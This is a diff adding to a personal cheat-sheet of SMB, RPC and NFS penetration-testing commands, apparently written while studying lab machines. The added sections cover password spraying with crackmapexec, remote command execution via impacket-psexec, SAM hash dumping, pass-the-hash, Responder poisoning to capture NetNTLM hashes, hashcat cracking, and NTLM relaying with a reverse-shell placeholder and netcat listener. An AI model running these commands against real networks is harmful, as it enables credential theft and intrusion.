@@ -1,6 +1,11 @@
 +---------------------------------------------------------------+
 |                      SMB & RPC QUICK NOTES                    |
 +---------------------------------------------------------------+
+SMB can be used on windows AND linux
+MSRPC is the Microsoft implementation of something similar to SMB
+
+* smbclient can be used for SMB AND RPC, but it's not the best tool for RPC
+* rpcclient is better to use for RPC
 
 SMB (samba) with smbclient
 
@@ -16,6 +21,27 @@ SMB (samba) with smbclient
   put <file>   # upload file to share (if permitted)
   exit/quit    # leave smbclient
 
+MORE ENUMERATION WITH SMBMAP:
+smbmap -H <target-ip>     # provides also a list of permissions for each shared folder
+
+using -r, you can browse the listed shares:
+smbmap -H <target-ip> -r sharename
+
+and download items:
+smbmap -H <target-ip> --download "notes\note.txt"
+(BE CAREFUL! The disk could be listed as .\Share\ so make sure --download ".\Share\")
+
+and upload:
+smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
+
+
+WINDOWS::
+On windows gui, do:
+1. 'Run' program
+2. Type \\<target-ip/host-ip>\<ShareName>
+3. tadaa!
+
+
 RPC SERVICE ENUM!
 you can get a cleaner output of rpc services using:
 rpcinfo -p <target-ip>
@@ -30,11 +56,68 @@ sudo mount -t nfs -o ro,vers=4,proto=tcp <SERVER_IP>:/ShareName /mnt/nfs-gimme/
 ^ try that first, if not, then v
 sudo mount -t nfs -o ro,vers=3,proto=tcp <SERVER_IP>:/ShareName /mnt/nfs-gimme/
 
+
+USING RPCCLIENT FOR RPC:
+anonymous login:
+rpcclient -U'%' <target-ip>
+
+(then enum all rpc users when logged in)
+enumdomusers
+
+
+ENUM4LINUX HELPS TO AUTOMATE FOR BOTH SMB AND RPC:
+logging in:
+./enum4linux-ng.py 10.10.11.45 -A -C
+
+
+BRUTE FORCING WITH CRACKMAPEXEC:
+crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
+(can also use a password list)
+
+
+PSEXEC AND RCE!:
+PsExec is on Microsoft's website -- it's freeware to administer remote systems.
+Other linux implementations are:
+
+Impacket PsExec - Python PsExec like functionality example using RemComSvc.
+impacket-psexec administrator:'Password123!'@10.10.110.17
+
+Impacket SMBExec - A similar approach to PsExec without using RemComSvc. The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
+Impacket atexec - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
+
+CrackMapExec - includes an implementation of smbexec and atexec.
+this is RCE:
+crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+this one is to extract hashes from SAM database:
+crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
+this one is to pass-the-hash:
+crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+
+
+Metasploit PsExec - Ruby PsExec implementation.
+this one enumerate:
+crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
+
+
 IF YOU FIND NTUSER.DAT
 you can get more info with:
 reglookup NTUSER.DAT > ntuser_dump.txt
 grep -Ein -C3 -E 'Software\\Microsoft\\Windows\\CurrentVersion\\Run|RunMRU|TypedPaths|Terminal Server Client|Servers|Internet Settings|Vault|RunOnce|TypedPath|UserAssist|password|passwd|pwd|secret|token|apikey|api_key|auth|credential|ssh-rsa|BEGIN RSA PRIVATE KEY|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}' ntuser_dump.txt | less -R
 
+IMPACKET SMB SHARE SERVER:
+sudo python3 smbserver.py -smb2support ShareName /home/ltnbob/Documents/
+
+SMBCLIENT SAVING ALL FROM SHARE
+(on host)
+mkdir <folder_to_save_to>
+
+smbclient //172.16.119.10/Share -U 'NEXURA\\hwilliam'
+(on target in smb)
+lcd <folder_to_save_to>     # local destination to save to
+recurse ON
+prompt OFF
+mget *
+exit
 
 
 RPC with rpcclient
@@ -61,6 +144,32 @@ GENERAL NOTES
 * When downloading files, verify ownership/permissions (UID/GID).
 * If anonymous is blocked, try common creds or authenticated scans (only with permission).
 * Log outputs locally for later analysis (e.g., smbclient -L output, rpcclient dumps).
+
+
+
+
+FORCED AUTHENTICATION ATTACKS WITH RESPONDER
+We can abuse the SMB protocol by creating a fake SMB server to capture users' NetNTLM v1/v2 hashes
+Responder is an LLMNR, NBT-NS, and MDNS poisoner tool.
+
+creating a fake SMB server using Responder w/ default config:
+responder -I <interface name>
+
+^ hashes can be cracked w/ hashcat
+(Responder logs can be found in /usr/share/responder/logs/)
+hashcat -m 5600 hash.txt rockyou.txt
+
+
+RELAYING RESPONDER HASHES TO ANOTHER MACHINE USING IMPACKET-NTLMRELAYX
+cat /etc/responder/Responder.conf | grep 'SMB ='
+(make sure that SMB = Off)
+
+impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
+or a powershell revshell:
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c '{insert revshell base64 command generated here}'
+nc -lvnp 1337
+
+
 
 +---------------------------------------------------------------+
 |                           END                                  |
